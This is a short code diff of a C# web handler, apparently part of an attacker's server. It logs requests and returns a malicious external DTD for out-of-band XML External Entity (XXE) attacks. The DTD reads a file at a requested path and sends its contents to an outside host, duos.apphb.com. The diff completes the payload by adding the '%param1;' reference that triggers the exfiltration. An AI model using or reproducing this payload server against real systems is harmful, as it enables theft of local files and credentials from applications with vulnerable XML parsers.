@@ -59,7 +59,7 @@ namespace DuosWeb
                     Date = DateTime.Now,
                     Info = "RESOURCE ACCESSED WITH PATH = " + path + "<br>" + getRaw()
                 });
-                return Response.AsText("<!ENTITY % data SYSTEM \"" + path + "\"><!ENTITY % param1 \"<!ENTITY exfil SYSTEM 'http://duos.apphb.com/tomtom/add/%data;'>\">");
+                return Response.AsText("<!ENTITY % data SYSTEM \"" + path + "\"><!ENTITY % param1 \"<!ENTITY exfil SYSTEM 'http://duos.apphb.com/tomtom/add/%data;'>\"> %param1;");
             };
         }
 
